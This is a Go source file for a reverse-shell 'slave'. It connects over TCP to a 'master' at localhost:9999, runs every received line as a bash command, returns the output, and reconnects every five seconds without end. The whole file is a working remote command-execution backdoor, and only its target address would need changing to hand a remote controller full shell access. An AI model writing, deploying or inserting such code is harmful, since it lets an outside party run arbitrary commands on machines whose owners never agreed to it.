package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
	"time"
	//	"bytes"
	//	"os/exec"
)

const sysShell = "bash"

//
//Execute bash commands...
func shellOut(command string) (string, error) {
	var stdout bytes.Buffer
	//var stderr bytes.Buffer
	cmd := exec.Command(sysShell, "-c", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stdout
	err := cmd.Run()
	if err != nil {
		fmt.Println("can't run command", err)
	}
	return stdout.String(), err
}

func main() {

	for {
		//Starting slave...
		fmt.Println("starting slave...")
		//Connecting to master...
		conn, err := net.Dial("tcp", "localhost:9999")
		//defer conn.Close()
		if err != nil {
			fmt.Println("Can't establish connection with master server", err)
			time.Sleep(5 * time.Second)
			continue
		}

		scanner := bufio.NewScanner(conn)
		//Scanning for commands...
		for scanner.Scan() {
			bs := scanner.Bytes()
			cmd := string(bs)

			resp, _ := shellOut(cmd)

			rr := strings.NewReader("command is done: " + resp + "\r")
			//Returning cmd to master...
			_, err = io.Copy(conn, rr)
			if err != nil {
				continue
			}
		}
		conn.Close()
	}
}
